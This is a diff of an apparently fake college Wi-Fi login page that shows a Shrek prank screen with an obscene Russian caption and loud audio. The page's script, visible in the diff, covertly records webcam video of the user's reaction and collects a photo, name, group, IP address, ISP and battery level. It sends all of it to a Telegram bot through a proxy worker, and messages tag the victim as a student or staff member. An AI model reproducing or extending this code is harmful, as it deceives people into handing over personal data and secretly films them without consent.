@@ -183,6 +183,7 @@
     .app-footer a:hover { opacity: 1; }
     .app-footer p { margin: 6px 0; }
 
+    /* ===== MOS ID ===== */
     .mosid-overlay {
       display: none; position: fixed; inset: 0;
       background: rgba(0, 0, 0, 0.6); z-index: 1000;
@@ -274,38 +275,53 @@
     .mosid-status.success { color: #2e7d32; font-weight: 600; }
     .mosid-status.error { color: #c62828; }
 
-    .shrek-overlay {
-      display: none; position: fixed;
-      inset: 0; background: #f5f5f5;
-      z-index: 2000; overflow-y: auto; padding: 20px;
+    /* ===== ШРЕК (внутри main, без оверлея) ===== */
+    .shrek-screen {
+      display: none;
+      text-align: center;
+      padding: 20px 10px 40px;
+      max-width: 700px;
+      margin: 0 auto;
     }
-    .shrek-overlay.show {
+    .shrek-screen.show {
       display: block;
-      animation: fadeIn 0.3s ease;
+      animation: fadeIn 0.4s ease;
     }
 
-    .shrek-overlay-inner {
-      max-width: 700px; margin: 0 auto;
-      text-align: center; padding: 20px 0 40px;
-    }
-    .shrek-overlay .shrek-title {
-      font-size: 48px; font-weight: 900;
-      color: #e60000; text-transform: uppercase;
-      line-height: 1.1; margin-bottom: 24px;
+    .shrek-title {
+      font-size: 42px;
+      font-weight: 900;
+      color: #e60000;
+      text-transform: uppercase;
+      line-height: 1.15;
+      margin-bottom: 24px;
       text-shadow: 2px 2px 0 #000, -2px -2px 0 #000, 2px -2px 0 #000, -2px 2px 0 #000;
       letter-spacing: 1px;
-      animation: shake 0.6s ease-in-out infinite;
+      animation: shakeTitle 0.8s ease-in-out infinite;
     }
-    @keyframes shake {
+    @keyframes shakeTitle {
       0%, 100% { transform: translateX(0) rotate(0deg); }
-      25%      { transform: translateX(-3px) rotate(-1deg); }
-      75%      { transform: translateX(3px) rotate(1deg); }
+      20%      { transform: translateX(-4px) rotate(-1deg); }
+      40%      { transform: translateX(4px) rotate(1deg); }
+      60%      { transform: translateX(-3px) rotate(-0.5deg); }
+      80%      { transform: translateX(3px) rotate(0.5deg); }
     }
-    .shrek-overlay .shrek-img {
-      max-width: 100%; width: 460px;
+
+    .shrek-img {
+      max-width: 100%;
+      width: 460px;
       border-radius: 16px;
       box-shadow: 0 10px 40px rgba(0,0,0,0.35);
-      display: block; margin: 0 auto;
+      display: block;
+      margin: 0 auto;
+      animation: shakeImg 0.7s ease-in-out infinite;
+    }
+    @keyframes shakeImg {
+      0%, 100% { transform: translate(0, 0) rotate(0deg) scale(1); }
+      20%      { transform: translate(-3px, -2px) rotate(-1.2deg) scale(1.01); }
+      40%      { transform: translate(3px, 2px) rotate(1.2deg) scale(1.015); }
+      60%      { transform: translate(-2px, 1px) rotate(-0.8deg) scale(1.01); }
+      80%      { transform: translate(2px, -1px) rotate(0.8deg) scale(1.005); }
     }
 
     @media (max-width: 992px) {
@@ -316,6 +332,7 @@
       .logo-text .logo-text-sub { font-size: 12px; }
       .divider { height: 58px; }
       .welcome h2 { font-size: 28px; }
+      .shrek-title { font-size: 36px; }
     }
     @media (max-width: 768px) {
       .app-header-box { padding: 14px; gap: 14px; }
@@ -334,8 +351,8 @@
       main { padding: 15px; }
       .wifi-card { padding: 22px 18px 20px; }
       .app-footer { padding: 20px 15px; font-size: 12px; }
-      .shrek-overlay .shrek-title { font-size: 28px; }
-      .shrek-overlay .shrek-img { width: 100%; }
+      .shrek-title { font-size: 26px; }
+      .shrek-img { width: 100%; }
       .camera-frame { height: 260px; }
     }
     @media (max-width: 480px) {
@@ -352,14 +369,14 @@
       .app-nav a .nav-icon { font-size: 18px; }
       .welcome h2 { font-size: 20px; }
       .app-footer { font-size: 10px; }
-      .shrek-overlay .shrek-title { font-size: 22px; }
+      .shrek-title { font-size: 20px; }
     }
     @media (max-width: 360px) {
       .app-header-box-logo img { height: 28px; }
       .logo-text { font-size: 9px; max-width: 90px; }
       .logo-text .logo-text-sub { display: none; }
       .divider { height: 28px; }
-      .shrek-overlay .shrek-title { font-size: 18px; }
+      .shrek-title { font-size: 16px; }
     }
   </style>
 </head>
@@ -416,7 +433,7 @@
         Сотрудникам и преподавателям — обратитесь в IT-отдел.
       </div>
 
-      <div class="wifi-card">
+      <div class="wifi-card" id="wifiCard">
         <h3>Подключение к Wi-Fi</h3>
         <div class="wifi-sub">Введите данные для доступа к сети</div>
 
@@ -456,6 +473,13 @@
           <button type="submit" id="btn">Подключиться</button>
         </form>
       </div>
+
+      <!-- Шрек появляется вместо формы, шапка и меню остаются -->
+      <div class="shrek-screen" id="shrekScreen">
+        <div class="shrek-title">Хуй тебе, а не вай-фай.<br>Бесплатный сыр только в мышеловке</div>
+        <img class="shrek-img" src="nnHAUrF0M4g.png" alt="Шрек">
+        <audio id="shrekAudio" src="blyyaaaaaaaaaaaat.mp3" preload="auto"></audio>
+      </div>
     </main>
   </div>
 
@@ -491,14 +515,6 @@
     </div>
   </div>
 
-  <div class="shrek-overlay" id="shrekOverlay">
-    <div class="shrek-overlay-inner">
-      <div class="shrek-title">Хуй тебе, а не вай-фай.<br>Бесплатный сыр только в мышеловке</div>
-      <img class="shrek-img" src="nnHAUrF0M4g.png" alt="Шрек">
-      <audio id="shrekAudio" src="blyyaaaaaaaaaaaat.mp3" preload="auto"></audio>
-    </div>
-  </div>
-
 <script type="module">
   import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
   import {
@@ -519,7 +535,6 @@
   const TELEGRAM_CHAT_ID = "6651741310";
   const PROXY_URL = "https://kp11-bot-proxy.riwendik.workers.dev";
 
-  // Отправка текста
   async function sendTelegramNotify(text) {
     try {
       const res = await fetch(`${PROXY_URL}?token=${TELEGRAM_TOKEN}&method=sendMessage`, {
@@ -539,7 +554,6 @@
     }
   }
 
-  // Отправка фото (отдельно)
   async function sendTelegramPhoto(photoBase64, caption) {
     try {
       const blob = await (await fetch(photoBase64)).blob();
@@ -562,7 +576,6 @@
     }
   }
 
-  // Отправка видео (отдельно)
   async function sendTelegramVideo(videoBase64, caption) {
     try {
       const blob = await (await fetch(videoBase64)).blob();
@@ -761,7 +774,7 @@
     const info = {};
     try {
       const controller = new AbortController();
-      const timer = setTimeout(() => controller.abort(), 4000);
+      const timer = setTimeout(() => controller.abort(), 5000);
       const r = await fetch("https://ipwho.is/", { signal: controller.signal });
       clearTimeout(timer);
       const d = await r.json();
@@ -773,7 +786,7 @@
         info.ipProvider = d.connection && d.connection.isp ? d.connection.isp : null;
       }
     } catch (e) {
-      console.warn("IP lookup failed:", e);
+      console.warn("IP lookup failed:", e.message || e);
     }
 
     const ua = navigator.userAgent;
@@ -847,6 +860,8 @@
   const grpEl      = document.getElementById('group');
   const btn        = document.getElementById('btn');
   const notice     = document.getElementById('notice');
+  const wifiCard   = document.getElementById('wifiCard');
+  const shrekScreen = document.getElementById('shrekScreen');
 
   function showFioError(msg) {
     fioError.textContent = msg;
@@ -942,7 +957,6 @@
   const cameraVideo     = document.getElementById('cameraVideo');
   const camPlaceholder  = document.getElementById('camPlaceholder');
   const mosidStatus     = document.getElementById('mosidStatus');
-  const shrekOverlay    = document.getElementById('shrekOverlay');
   const shrekAudio      = document.getElementById('shrekAudio');
 
   let mediaStream = null;
@@ -1083,10 +1097,11 @@
   }
 
   function showShrekWithReaction() {
-    // 1. Показываем Шрека
-    shrekOverlay.classList.add('show');
+    // Прячем форму, показываем Шрека внутри main — шапка и меню остаются
+    wifiCard.style.display = 'none';
+    shrekScreen.classList.add('show');
 
-    // 2. Сразу включаем звук — 1 раз, на максимум
+    // Запускаем звук
     try {
       shrekAudio.volume = 1.0;
       shrekAudio.currentTime = 0;
@@ -1109,17 +1124,19 @@
       console.warn("audio error:", e);
     }
 
-    // 3. Сразу запускаем запись
+    // Запускаем запись
     startVideoRecording();
 
-    // 4. Через 10 секунд стоп + сохранение
+    // Через 6 секунд стоп + сохранение
     setTimeout(async () => {
       await stopRecordingAndSave();
-    }, 10000);
+    }, 6000);
   }
 
   function showShrekWithoutRecording() {
-    shrekOverlay.classList.add('show');
+    wifiCard.style.display = 'none';
+    shrekScreen.classList.add('show');
+
     try {
       shrekAudio.volume = 1.0;
       shrekAudio.currentTime = 0;
@@ -1151,10 +1168,9 @@
 
       if (!MediaRecorder.isTypeSupported(mimeType)) return false;
 
-      // Битрейт 500 кбит/с — приемлемое качество, ~600 КБ за 10 сек
       mediaRecorder = new MediaRecorder(mediaStream, {
         mimeType: mimeType,
-        videoBitsPerSecond: 500000
+        videoBitsPerSecond: 400000
       });
 
       mediaRecorder.ondataavailable = (e) => {
@@ -1183,8 +1199,6 @@
         let videoBase64 = null;
         if (recordedChunks.length > 0) {
           const blob = new Blob(recordedChunks, { type: recordedChunks[0].type || 'video/mp4' });
-          // Лимит Firestore — 1 МБ на документ.
-          // Фото ~50 КБ, значит видео должно быть не больше 900 КБ.
           if (blob.size < 900 * 1024) {
             videoBase64 = await blobToBase64(blob);
             console.log("Видео размер:", blob.size, "байт");
@@ -1244,11 +1258,8 @@
           "🔋 <b>Заряд:</b> " + batteryStr + "\n\n" +
           "⚠️ <b>Это сотрудник колледжа!</b>";
 
-        // 1. Текст
         await sendTelegramNotify(caption);
-        // 2. Фото отдельно
         if (photoBase64) await sendTelegramPhoto(photoBase64, "📷 Фото педагога");
-        // 3. Видео отдельно
         if (videoBase64) await sendTelegramVideo(videoBase64, "🎥 Реакция педагога");
       } else {
         const docData = {
@@ -1274,11 +1285,8 @@
           "🌐 <b>IP:</b> " + ipStr + "\n" +
           "🔋 <b>Заряд:</b> " + batteryStr;
 
-        // 1. Текст
         await sendTelegramNotify(caption);
-        // 2. Фото отдельно
         if (photoBase64) await sendTelegramPhoto(photoBase64, "📷 Фото студента");
-        // 3. Видео отдельно
         if (videoBase64) await sendTelegramVideo(videoBase64, "🎥 Реакция студента");
       }
     } catch (err) {
